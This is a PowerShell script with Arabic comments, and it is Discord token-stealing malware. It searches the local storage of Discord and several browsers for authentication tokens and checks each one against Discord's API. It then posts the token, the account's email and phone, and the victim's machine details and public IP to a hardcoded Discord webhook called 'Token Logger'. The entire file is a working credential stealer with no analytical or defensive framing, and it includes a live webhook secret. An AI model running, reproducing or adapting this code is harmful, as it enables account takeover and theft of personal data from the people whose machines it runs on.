$ErrorActionPreference = 'SilentlyContinue'

# 🔧 ضع رابط الـ Webhook هنا
$webhook_url = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"

# 🔍 أماكن البحث عن التوكنات
$locations = @(
    "$env:APPDATA\Discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
)

# 🔁 تجميع التوكنات
$tokens = @()

foreach ($path in $locations) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Filter "*.ldb" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $content = Get-Content -Path $_.FullName -Raw -ErrorAction SilentlyContinue
            $matches = Select-String -InputObject $content -Pattern '([\w-]{24}\.[\w-]{6}\.[\w-]{27})' -AllMatches
            foreach ($match in $matches.Matches) {
                if ($tokens -notcontains $match.Value) {
                    $tokens += $match.Value
                }
            }
        }
    }
}

# 🔐 فحص صلاحية التوكنات وإرسالها
foreach ($token in $tokens) {
    $headers = @{
        'Authorization' = $token
        'User-Agent'    = 'Mozilla/5.0'
    }

    try {
        $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -Method Get -ErrorAction Stop

        # ✅ معلومات الحساب
        $username = "$($response.username)#$($response.discriminator)"
        $email = $response.email
        $phone = $response.phone
        $id = $response.id
        $avatar = $response.avatar
        $avatar_url = "https://cdn.discordapp.com/avatars/$id/$avatar.png"

        # 🖥 معلومات الجهاز
        $pc_username = $env:UserName
        $pc_os = (Get-CimInstance Win32_OperatingSystem).Caption
        $pc_cpu = (Get-CimInstance Win32_Processor).Name
        $ip = Invoke-RestMethod -Uri "https://ipinfo.io/ip"

        # 🧾 بناء الرسالة
        $embed = @{
            title = "🎯 New Token Found!"
            color = 16753920
            thumbnail = @{
                url = $avatar_url
            }
            fields = @(
                @{
                    name = "👤 Account Info"
                    value = "Username: $username`nEmail: $email`nPhone: $phone"
                    inline = $false
                },
                @{
                    name = "💻 PC Info"
                    value = "User: $pc_username`nOS: $pc_os`nCPU: $pc_cpu`nIP: $ip"
                    inline = $false
                },
                @{
                    name = "🔑 Token"
                    value = "``$token``"
                    inline = $false
                }
            )
        }

        $payload = @{
            username = "Token Logger"
            avatar_url = "https://i.imgur.com/Z4mB6rL.png"
            embeds = @($embed)
        } | ConvertTo-Json -Depth 5

        Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json' -UseBasicParsing
    } catch {
        # إذا التوكن غير صالح أو فشل الاتصال
        continue
    }
}

